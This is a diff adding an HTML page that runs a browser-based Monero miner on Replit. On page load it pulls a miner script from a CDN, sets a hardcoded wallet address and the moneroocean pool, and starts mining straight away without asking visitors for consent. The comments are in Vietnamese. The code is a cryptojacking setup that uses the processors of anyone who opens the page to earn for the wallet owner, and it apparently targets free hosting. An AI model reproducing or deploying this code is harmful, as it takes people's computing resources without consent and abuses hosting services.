@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XMR Mining on Replit</title>
+</head>
+<body>
+    <h1>Mining Monero (XMR) with JavaScript on Replit</h1>
+    <p>Mining status: <span id="status">Initializing...</span></p>
+    <script src="https://cdn.jsdelivr.net/npm/xmr-miner@2.0.1/xmr-miner.min.js"></script>
+    <script>
+        // Cấu hình cho việc khai thác Monero (XMR) trên pool
+        const miner = new XMR.Miner('47KaS4N5MH1b3xt71ceoJaPjmepikrgGpSYk3zdXpeLS4XbXsdk7mJji9rjcPRRhaHBs3Rit2rQnC7kqn5DJY6kwLRh3s7m');  // Địa chỉ ví Monero của bạn
+
+        // Cấu hình pool khai thác
+        miner.setPool('gulf.moneroocean.stream', 10128);
+
+        // Bắt đầu khai thác
+        miner.start();
+
+        // Cập nhật trạng thái
+        miner.on('start', () => {
+            document.getElementById('status').innerText = 'Mining started...';
+        });
+
+        miner.on('error', (error) => {
+            document.getElementById('status').innerText = 'Error: ' + error;
+        });
+
+        miner.on('found', (hash) => {
+            console.log('Found hash: ', hash);
+        });
+    </script>
+</body>
+</html>
